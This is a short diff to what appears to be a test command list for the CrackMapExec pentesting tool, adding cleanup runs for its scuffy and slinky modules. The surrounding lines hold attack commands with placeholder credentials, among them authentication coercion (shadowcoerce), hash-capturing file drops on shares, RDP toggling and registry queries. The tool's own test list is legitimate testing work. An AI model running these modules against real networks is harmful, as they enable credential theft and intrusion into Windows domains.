@@ -63,8 +63,10 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=disabl
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M reg-query -o PATH=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion KEY=DevicePath
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M runasppl
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M scuffy -o SERVER=127.0.0.1 NAME=test
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M scuffy -o NAME=test CLEANUP=True
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M shadowcoerce
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M slinky -o SERVER=127.0.0.1 NAME=test
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M slinky -o NAME=test CLEANUP=True
 # spider_plus takes a while to run, so it is commented out during normal testing
 # crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M spider_plus -o MAX_FILE_SIZE=100
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M spooler
